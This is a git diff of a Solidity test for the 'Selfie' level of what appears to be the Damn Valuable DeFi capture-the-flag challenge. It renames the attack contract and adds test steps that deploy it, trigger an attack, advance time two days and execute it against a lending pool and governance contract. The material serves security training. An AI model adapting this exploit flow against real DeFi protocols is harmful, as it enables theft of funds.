@@ -10,7 +10,7 @@ import {DamnValuableTokenSnapshot} from "../../../Contracts/DamnValuableTokenSna
 import {SimpleGovernance} from "../../../Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../Contracts/selfie/SelfiePool.sol";
 
-contract AttackerContract {
+contract AttackContract {
     address public owner;
 
     SelfiePool selfiePool;
@@ -91,6 +91,17 @@ contract Selfie is DSTest {
 
     function testSelfieExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        AttackContract attackContract = new AttackContract(
+            selfiePool,
+            dvtSnapshot,
+            simpleGovernance
+        );
+        attackContract.attack();
+        vm.warp(block.timestamp + 2 days);
+        attackContract.executeAttack();
+
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
